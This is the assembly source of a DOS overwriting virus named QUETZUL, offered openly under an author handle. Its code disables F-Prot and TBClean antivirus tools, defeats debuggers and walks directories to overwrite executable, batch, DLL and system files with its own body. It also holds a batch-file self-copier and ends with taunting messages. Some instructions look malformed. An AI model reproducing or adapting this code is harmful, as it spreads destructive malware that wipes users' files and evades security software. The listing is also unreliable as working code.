; App:     DOS.QUETZUL v3.0
; Author: AzagTH0TH
; Notes: ~~~~~~Let the GODS hear your whispers on the winds~~~~~~~


code    segment byte public
        assume  cs : code
        org     100h

begin:
        mov     ax, 4653h                       ; Remove F-Prot Utils
        mov     bx, 1
        mov     cx, 2
        rep     int  2Fh

             mov     ax,0E07h                ; BIOS display char., BEL
beep_loop:
        int     010h                    ; Beep
        loop    beep_loop               ; Beep until 
        mov cx,999


push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     bx,1                    ; Convert to word index
        shl     si,1                    ; Convert to word index
        mov     ax,word ptr [bx + 03FEh]; Zero COM port address
        xchg    word ptr [si + 03FEh],ax; Put first value in second,
        mov     word ptr [bx + 03FEh],ax; and second value in first!
        mov    bx,3
        mov    si,1
        pop     es                      ; Restore ES

        mov     byte ptr cs:[tb_here][bp], 0    ; Reset TB Flag
        xor     dx, dx
        mov     ds, dx
        mov     ax, word ptr ds:[6]
        dec     ax
        mov     ds, ax

        mov     cx, 0FFFFh                      ; CX = 64k
        mov     si, dx                          ; SI = 0

look_4_tbclean:
        mov     ax, word ptr ds:[si]
        xor     ax, 0A5F3h
        je      check_it                        ; Jump If It's TBClean
look_again:
        inc     si                              ; Continue Search
        loop    look_4_tbclean
        jmp     not_found                       ; TBClean Not Found

check_it:
        mov     ax, word ptr ds:[si+4]
        xor     ax, 0006h
        jne     look_again
        mov     ax, word ptr ds:[si+10]
        xor     ax, 020Eh
        jne     look_again
        mov     ax, word ptr ds:[si+12]
        xor     ax, 0C700h
        jne     look_again
        mov     ax, word ptr ds:[si+14]
        xor     ax, 406h
        jne     look_again

        mov     bx, word ptr ds:[si+17]         ; Steal REAL Int 1 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replace With IRET

        mov     bx, word ptr ds:[si+27]         ; Steal REAL Int 3 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replece With IRET

        mov     byte ptr cs:[tb_here][bp], 1    ; Set The TB Flag On

        mov     bx, word ptr ds:[si+51h]        ; Get 2nd Segment of
        mov     word ptr cs:[tb_int2][bp], bx   ; Vector Table

        mov     bx, word ptr ds:[si-5]          ; Get Offset of 1st Copy
        mov     word ptr cs:[tb_ints][bp], bx   ; of Vector Table

not_found:
        mov     cx, 9EBh
        mov     ax, 0FE05h
        jmp     $-2
        add     ah, 3Bh                         ; Hlt Instruction (Kills TD)
        jmp     $-10

        mov     ax, 0CA00h                      ; Exit It TBSCANX In Mem
        mov     bx, 'TB'
        int     2Fh

        cmp     al, 0
        je      okay
        ret

okay:
      
        mov     numinfected, 0                  ; Clear The Infected Counter

        mov     ax, 3524h                       ; New INT 24h Handler
        int     21h
        mov     ax, 2524h
        mov     dx, offset Int24
        int     21h

        mov     ah, 47h                         ; Function: Get Current Dir
        xor     dl, dl                          ; Current Drive
        mov     si, offset dir_buff             ; Buffer For Directory
        int     21h                             ; Execute Function
        

traverse        proc    near

        push    bp
        push    bp
        pop     di

        mov     bp, sp                          ; Set Stack Frame
        sub     sp, 128

        mov     dx, 'QT'
        int     014h
        mov     ah, 4Eh                         ; Find First Directory
        mov     cx, 00010000b                   ; Attributes
        mov     dx, offset files
        int     21h
        jc      leave_traverse                  ; No Directories Present

check_dir:
        cmp     byte ptr [bp - 107], 16         ; Directory?
        jne     another_dir                     ; No, Try Again
        cmp     byte ptr [bp - 98], '.'         ; "." or ".."?
        je      another_dir                     ; Keep Going

        mov     ah, 3Bh                         ; Change Directory
        lea     dx, [bp - 98]
        int     21h

        call    traverse                        ; Call Ourself

        pushf
        mov     ah, 3Bh                         ; Change Directory
        mov     dx, offset up_dir
        int     21h
        popf

        jnc     done_searching

another_dir:
        mov     ah, 4Fh                         ; Find Next Directory
        int     21h
        jnc     check_dir

leave_traverse:

        mov     dx, offset com_spec
        call    infect
        mov     dx, offset bat_spec             ; Find BAT's
        mov     doingbat, 1
        mov     ah, 4Eh
        call    infect
        mov     dx, offset bin_spec
        call    infect
        mov     dx, offset ovr_spec
        call    infect
        mov     dx, offset exe_spec
        call    infect
        mov     dx, offset vxd_spec
        call    infect
        mov     dx, offset dll_spec
        call    infect
        mov     dx, offset sys_spec
        call    infectsys

done_searching:
        mov     sp, bp                          ; Restore Old Stack Frame
        pop     bp                              ; Restore BP
        ret

up_dir  db      "..",0                          ; Parent directory name
files   db      "*.*",0                         ; Directories to search for
traverse  endp
infectsys:
infect: int     21h                             ; Execute Function
        jc       leave_traverse                 ; Change Dirs On Error

        cmp     word ptr [bp+80h+33], 'AM'      ; If File is COMMAND.COM
        jz      quit                            ; Then Quit!

        mov     ax, 3d02h                       ; Function: Open File R/W
        mov     dx, offset+80h+30               ; DTA+30 Is The Filename
        int     21h                             ; Execute Function
        jc      quit                            ; Quit On Error
        xchg    ax, bx                          ; This Is The Filename

        mov     ax, 5700h                       ; Function: Get Date & Time
        int     21h                             ; Execute Function
        push    cx                              ; Save Date & Time
        push    dx

        mov     dx, offset+80h+30               ; The Filename
        mov     ax, 4300h                       ; Function: Get File Attrib
        int     21h                             ; Execute Function
        jc      quit                            ; Quit On Error
        push    cx                              ; Save Attribute / Filename
        push    dx

        mov     ax, 4301h                       ; Function: Set File Attrib
        push    ax                              ; Save Function For Later
        xor     cx, cx                          ; Clear Attributes
        int     21h                             ; Execute Function

        cmp     doingbat, 1
        jne     notdoingbat
        mov     ah, 40h                         ; Function: Write To File
        mov     cx, endofbatchvirus - batchvirus
        mov     dx, offset batchvirus
        int     21h                             ; Execute Function
        jc      quit                            ; Quit On Error
        jmp     afterinfect
        int     5h

notdoingbat:
        mov     ah, 40h                         ; Function: Write To File
        mov     cx, heap-begin
        mov     di, 100h
        int     21h                             ; Execute Function
        jc      quit                            ; Quit On Error
afterinfect:

        mov     ax, 5701h                       ; Set Orig Date and Time
        pop     dx
        pop     cx
        int     21h

        pop     ax                              ; Restore Attributes
        pop     dx
        pop     cx
        int     21h

quit:
        mov     ah, 3Eh                         ; Close File
        int     21h

        inc     [bp+numinfected]                ; Count File as Infected
        cmp     [bp+numinfected], 3
        jae     kill                            ; If We Infected Enough, Quit
        mov     ah,4fh                          ; Function: Find Next File
        jmp     infect                          ; Get Another File
        int     5h
kill:
        mov     ah, 3Bh                         ; Function: Change Directory
        mov     dx, offset dir_buff             ; Restore Current Directory
        int     21h                             ; Execute Function

        mov     ax, 2524h                       ; New INT 24h Handler
        pop     dx
        pop     ds
        int     21h

        retn                                    ; Return To Original File
Int24:  mov     ax, 3                           ; Error Handling
        iret    
int     18h

batchvirus      db      10,13,'@Ctty Nul'
                db      10,13,'For %%F In (*.Bat) Do Copy %0.BAT %%F'
                db      10,13,'CD\'
                db      10,13,'For %%F In (*.Bat) Do Copy %0.BAT %%F'
                db      10,13,'Ctty Con'
endofbatchvirus:

bat_spec        db      '*.BAT',0               ; BAT Filespec
bin_spec        db      '*.BIN',0               ; BIN Filespec
com_spec        db      '*.COM',0               ; COM Filespec
dll_spec        db      '*.DLL',0               ; DLL Filespec
exe_spec        db      '*.EXE',0               ; EXE Filespec
ovr_spec        db      '*.OV?',0               ; OV? Filespec
vxd_spec        db      '*.VXD',0               ; VXD Filespec
sys_spec        db      '*.SYS',0               ; SYS Filespec


heap:

      mov       si,offset msg1
            add       si,bp
            call      disp

      mov       si,offset msg2
            add       si,bp
            call      disp
      
      mov       si,offset msg3
            add       si,bp
            call      disp

       mov       si,offset msg4
            add       si,bp
            call      disp

     mov       si,offset msg5
            add       si,bp
            call      disp

            ret
disp:
            lodsb
            cmp        al,00
            je         done_disp
            int        29h
            jmp        disp
done_disp:
            ret

msg1: db 10,13,"{{{(quote)Quetzalcoatl was often considered the God of the morning star.",10,13,0
msg2: db 10,13," As the morning star he was known under the title Tlahuizcalpantecuhtli...which means literaly ---The Lord of the Star of the Dawn---.",10,13,0
msg3: db 10,13,"He was known as the inventor of books and the calendar..and sometimes as a symbol of death and resurrection(quote)}}}",10,13,0
msg4: db 10,13,"//////////////////////////////////FEAR THE ANCIENT OF DAYS...AND REMEMBER YESTRDAY'S TOMMORROWS\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",10,13,0
msg5  db 10,13,"-=-=-=-=<><><><>___NO ONE is SAFE from the WRATH of a -=[3L1(\)D /-\E0(\]=-___<><><><>=-=-=-=-",10,13,0
donebin         db      0
dir_buff        db      64 dup (0)              ; Current Dir Buffer
newdta          db      43 dup (?)              ; New Disk Transfer Access
doingbat        db      ?
numinfected     db      ?                       ; Number Of Files Infected
tb_ints         dd      0
tb_int2         dd      0
tb_here         db      0
writebuffer     dw      ?                       ; Scratch Buffer 

code    ends
        end begin
